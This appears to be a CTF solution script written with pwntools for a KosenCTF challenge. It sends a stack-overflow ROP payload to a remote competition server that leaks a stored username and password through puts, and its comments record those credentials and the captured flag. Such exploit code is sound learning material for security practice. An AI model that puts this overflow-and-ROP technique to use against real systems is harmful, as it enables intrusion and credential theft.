from pwn import *

r = remote("pwn.kosenctf.com", 9002)

puts = 0x4006a6
username = 0x6020c0
password = 0x6020e0
pop_rdi = 0x400b03
payload = b"A" * 0x28 + p64(pop_rdi) + p64(username) + p64(puts)[:-1]
# payload = b"A" * 0x28 + p64(pop_rdi) + p64(password) + p64(puts)[:-1]
r.send(payload)

r.recvuntil("Password: ")
r.shutdown("send")

r.interactive()
# username: UnderUltimateUtterUranium
# password: PonPonPainPanicParadigm
# KosenCTF{cl0s3_ur_3y3_4nd_g0_w1th_th3_fl0w}�
